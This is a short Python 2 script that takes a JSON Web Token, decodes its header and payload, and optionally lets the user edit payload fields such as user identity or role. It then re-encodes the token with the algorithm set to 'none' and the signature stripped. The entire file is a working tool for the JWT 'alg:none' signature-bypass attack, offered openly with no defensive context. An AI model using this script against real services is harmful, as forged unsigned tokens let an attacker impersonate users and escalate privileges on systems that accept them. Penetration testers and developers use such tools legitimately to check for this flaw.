#!/usr/bin/env python

import argparse
import base64
import json

def tamper(data, is_list=False):
	result = {}
	for key in data.keys():
		if type(data[key]) != dict and type(data[key]) != list:
			tab = "\t\t" if is_list else "\t"
			new = raw_input(tab + str(key) + " [ " + str(data[key]) + " ] ")
			if new == '':
				result[key] = data[key]
			else:
				result[key] = new
		else:
			if type(data[key]) == list:
				dict_from_list = { i : data[key][i] for i in range(0, len(data[key]) ) }
				print "\t" + key + " array:"
				result[key] = tamper(dict_from_list, True)
			else:
				result[key] = tamper(data[key])
	if is_list:
		return list(result.values())
	else:
		return result

parser = argparse.ArgumentParser(description="Modify a JWT token and set the alg to none.") 
parser.add_argument('token', type=str, help='JWT Token to modify')
parser.add_argument('-t', dest='tamper_flag', action="store_true", default=False, help="Tamper with the payload")
args = parser.parse_args()

token = args.token

token_parsed = token.split(".")

clear_header = base64.urlsafe_b64decode(token_parsed[0]+'===') 
clear_payload = base64.urlsafe_b64decode(token_parsed[1]+'===')

print "Current algorithm: ", json.loads(clear_header)['alg']
print "Payload contents: ", clear_payload
print "-" 
if args.tamper_flag:
	print "Tamper with payload contents:"
	new_payload = json.dumps(tamper(json.loads(clear_payload)))
else: 
	new_payload = clear_payload
b64_header = base64.urlsafe_b64encode('{"typ":"JWT","alg":"none"}').strip("=")
b64_payload = base64.urlsafe_b64encode(new_payload).strip("=")

new_token = b64_header + "." + b64_payload + "."

print "New token: ", new_token

